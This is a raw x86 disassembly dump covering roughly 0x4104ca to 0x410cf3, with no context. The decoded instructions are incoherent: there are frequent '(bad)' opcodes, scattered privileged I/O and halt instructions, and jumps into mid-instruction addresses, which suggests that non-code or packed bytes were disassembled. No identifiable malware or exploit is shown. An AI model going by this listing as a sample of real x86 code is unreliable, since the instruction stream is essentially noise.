  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
